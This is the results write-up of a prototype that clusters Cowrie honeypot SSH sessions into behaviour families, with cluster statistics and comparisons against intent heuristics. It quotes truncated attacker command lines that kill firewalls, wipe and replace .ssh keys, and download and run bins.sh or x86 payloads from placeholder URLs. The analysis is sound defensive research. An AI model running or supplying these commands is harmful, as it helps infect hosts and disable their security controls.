# Clustering Prototype - Results

- Sample: 77,984 Cowrie command sessions (2026-02-17 to 2026-03-31), time-based split 70%/30% (no shuffling)
- Train: 54,588 sessions -> **71 behavior families** (models are fitted on families, weighted by sessions)
- K-Means: **k = 12**, silhouette 0.1289
- DBSCAN: eps 11.30, min_samples 10 sessions -> 8 clusters, 9 rare families (19 sessions) marked as noise
- Test: 23,396 sessions; 459 (2.0%) use a family never seen in train; 6 sessions are far from every cluster (distance > 95th percentile of train)
- Agreement with rule-based intent profiles (Adjusted Rand Index): **0.94** (1 = same grouping, 0 = unrelated)

## K-Means clusters

| Cluster | Sessions | Share | Families | IPs | Med. cmds | Med. gap s | Top intents | Top clients | Biggest family |
|---:|---:|---:|---:|---:|---:|---:|:---|:---|:---|
| 0 | 7,242 | 13.3% | 4 | 1,562 | 3 | 0.277 | cleanup_evasion 100%, persistence 100% | libssh 100% | `cd ~ ; chattr -ia .ssh ; lockr -ia .ssh ; lockr -ia .ssh ; cd ~ && rm -rf .ssh && mkdir .s…` |
| 1 | 34,333 | 62.9% | 3 | 7 | 1 | 0 | none | go 100% | `echo -e <STR>` |
| 2 | 9,724 | 17.8% | 3 | 459 | 5 | 0.001 | recon 100% | go 100% | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH ; uname=$(u…` |
| 3 | 453 | 0.8% | 15 | 250 | 20 | 1.484 | execute 96%, recon 88%, persistence 88%, cleanup_evasion 88% | libssh 100% | `cd ~ ; chattr -ia .ssh ; lockr -ia .ssh ; lockr -ia .ssh ; cd ~ && rm -rf .ssh && mkdir .s…` |
| 4 | 35 | 0.1% | 2 | 26 | 10 | 0.618 | recon 97%, cleanup_evasion 97% | libssh 100% | `/ip cloud print ; /ip cloud print ; ifconfig ; uname -a ; cat /proc/cpuinfo ; ps \| grep <…` |
| 5 | 375 | 0.7% | 3 | 31 | 1 | 0 | recon 99% | go 87%, other 12% | `uname -a` |
| 6 | 907 | 1.7% | 4 | 81 | 1 | 0 | recon 91% | go 100% | `uname -s -v -n -r -m` |
| 7 | 15 | 0.0% | 3 | 5 | 7 | 0.835 | download 100%, execute 100%, cleanup_evasion 93% | putty 80%, libssh 13% | `wdir="/bin" ; for i in "/bin" "/home" "/root" "/tmp" "/usr" "/etc" ; do ; if [ -w $i ] ; t…` |
| 8 | 13 | 0.0% | 4 | 3 | 2 | 0.001 | recon 62% | openssh 100% | `cat /proc/cpuinfo\|grep name\|cut -f2 -d':'\|uniq -c ; uname -a ; cut -f2 -d:` |
| 9 | 180 | 0.3% | 2 | 4 | 1 | 0 | none | paramiko 100% | `echo -n login_success` |
| 10 | 10 | 0.0% | 2 | 2 | 4 | 26.6495 | execute 100%, cleanup_evasion 100% | putty 100% | `#!sh ; ; wdir="/tmp" ; for i in "/tmp" <STR> <STR> "/usr" "/bin" "/home" "/root" ; do ; if…` |
| 11 | 1,301 | 2.4% | 26 | 55 | 1 | 0 | recon 60% | go 100%, libssh 0% | `hostname` |

## Clusters vs. rule-based intent profiles (train sessions)

```
kmeans                                       0      1     2    3   4    5    6   7   8    9   10   11
intent_profile                                                                                       
cleanup_evasion                              18      0     0    0   0    0    0   0   0    0   0    2
download+execute                              0      0     0    0   0    2    0   1   0    0   0    0
download+execute+cleanup_evasion              0      0     0    0   0    0    0  14   0    0   0    0
execute                                       0      0     0   55   0    0    0   0   0    0   0   78
execute+cleanup_evasion                       0      0     0    0   0    0    0   0   0    0  10    0
persistence+cleanup_evasion                7221      0     0    0   0    0    0   0   0    0   0    0
recon                                         0      0  9724    0   0  373  829   0   8    0   0  684
recon+cleanup_evasion                         0      0     0    0  34    0    0   0   0    0   0    0
recon+execute                                 0      0     0    0   0    0    0   0   0    0   0   38
recon+execute+persistence+cleanup_evasion     0      0     0  378   0    0    0   0   0    0   0   63
recon+persistence+cleanup_evasion             0      0     0   20   0    0    0   0   0    0   0    0
unclassified                                  3  34333     0    0   1    0   78   0   5  180   0  436
```

## Rare behavior (DBSCAN noise, top 10 by sessions)

- 7 sessions, 2 IPs, K-Means cluster 8: `cat /proc/cpuinfo\|grep name\|cut -f2 -d':'\|uniq -c ; uname -a ; cut -f2 -d:`
- 4 sessions, 1 IPs, K-Means cluster 8: `ls`
- 2 sessions, 1 IPs, K-Means cluster 7: `cd /tmp ; <DL> <URL> <CHMOD_X> x86 ; ./x86 x86.itsmy ; rm -rf *`
- 1 sessions, 1 IPs, K-Means cluster 7: `cd /tmp ; <DL> <URL> busybox <DL> <URL> <CHMOD_X> sensi.sh ; sh sensi.sh ; rm -f sensi.sh`
- 1 sessions, 1 IPs, K-Means cluster 5: `echo <N> > /dev/null && cat echo ; nohup $SHELL -c "<DL> <URL> -o /tmp/zZ3SPqUllv ; if [ ! -f /tmp/zZ3SPqUllv …`
- 1 sessions, 1 IPs, K-Means cluster 5: `echo <N> > /dev/null && cat echo ; nohup $SHELL -c "<DL> <URL> -o /tmp/v1LzbzMhVp ; if [ ! -f /tmp/v1LzbzMhVp …`
- 1 sessions, 1 IPs, K-Means cluster 8: `close ; close ; exit`
- 1 sessions, 1 IPs, K-Means cluster 8: `pwd ; whoami ; echo test ; ls -la ; ls ; cd .. ; ls ; cd .. ; ls ; ls var ; ls usr ; ls etc ; nano etc/passwwd…`
- 1 sessions, 1 IPs, K-Means cluster 4: `/ip cloud print ; /ip cloud print`

## New behavior in the test period (families never seen in train, top 10)

- 69 sessions -> cluster 1: `hostname ; echo <STR> ; uname -a ; echo <STR> ; whoami ; echo <STR> ; pwd ; echo <STR> ; ls -la / ; echo <STR>…`
- 67 sessions -> cluster 7: `pkill iptables -<N> ; pkill firewalld -<N> ; cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd / ; <…`
- 25 sessions -> cluster 7: `pkill iptables -<N> ; pkillfirewalld -<N> ; cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd / ; ; …`
- 23 sessions -> cluster 7: `pkill iptables -<N> ; pkill firewalld -<N> ; cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd / ; b…`
- 22 sessions -> cluster 7: `echo Tux:) ; pkill iptables -<N> ; pkillfirewalld -<N> ; cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \…`
- 9 sessions -> cluster 1: `echo OKTEST123`
- 5 sessions -> cluster 7: `pkill iptables -<N> ; pkill firewalld -<N> ; <DL> sshbins.sh <URL> <DL> <URL> <CHMOD_X> sshbins.sh ; sh sshbin…`
- 4 sessions -> cluster 11: `uname -a ; cat /proc/cpuinfo ; free -m ; dmidecode\|grep Vendor\|head -n <N> ; dmidecode ; ps -x ; dmesg \| gr…`
- 4 sessions -> cluster 1: `echo login_success`
- 3 sessions -> cluster 7: `cd /tmp \|\| cd /var/run \|\| cd /mnt \|\| cd /root \|\| cd / ; ; <DL> <URL> <CHMOD_X> bins.sh ; ; sh bins.sh …`

*Clusters are groups of similar behavior, not proof that the same actor is behind them. Intent profiles are heuristics from db_analyzer.py, not ground truth.*